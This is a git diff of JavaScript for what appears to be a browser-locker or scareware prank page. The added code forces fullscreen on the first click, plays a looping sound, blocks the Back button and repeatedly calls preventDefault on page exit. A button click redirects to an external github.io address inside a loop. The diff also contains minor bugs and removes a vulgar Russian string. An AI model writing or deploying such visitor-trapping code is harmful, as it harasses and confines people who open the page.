@@ -1,4 +1,12 @@
 let fullscreenActivated = false;
+const audio = new Audio("zvuki.mp3");
+audio.loop = true;
+
+function startSound() {
+   audio.play().catch(() => {});
+  document.removeEventListener("mousemove", startSound);
+  document.removeEventListener("click", startSound);
+}
 
 // Fullscreen после первого взаимодействия
 function activateFullscreen() {
@@ -8,17 +16,15 @@ function activateFullscreen() {
         else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
 
         fullscreenActivated = true;
-        document.getElementById("hint").style.display = "none";
+        //document.getElementById("hint").style.display = "none";
     }
 }
 
-//window.location.href = "https://rsrchr1.github.io/uab/";
-document.addEventListener("mousemove", (e) => {
-  if (e.clientX > 500) {
-    location.href = "https://rsrchr1.github.io/uab/";
-  }
+document.body.addEventListener("click", () => {
+	activateFullscreen();
+	startSound();
 });
-document.body.addEventListener("click", activateFullscreen);
+document.addEventListener("mousemove", startSound());
 document.body.addEventListener("touchstart", activateFullscreen);
 
 // Блокировка кнопки "Назад"
@@ -28,12 +34,11 @@ window.onpopstate = function () {
 };
 
 // Предупреждение при закрытии
-window.onbeforeunload = function () {
-	while(true){
-		return "Вы уверены, что хотите выйти?";
+window.addEventListener("beforeunload", (e) => {
+	for(i=10000;i>0;i--) {
+		e.preventDefault();
 	}
-	return "SOSI"
-};
+});
 
 // Регистрация service worker (для PWA)
 if ("serviceWorker" in navigator) {
@@ -41,8 +46,8 @@ if ("serviceWorker" in navigator) {
 }
 
 document.getElementById("go").addEventListener("click", () => {
-  activateFullscreen;
-  while (true) {
+  activateFullscreen();
+  for(i=10000;i>0;i--) {
 	location.href = "https://rsrchr1.github.io/uab/";
   }
 });
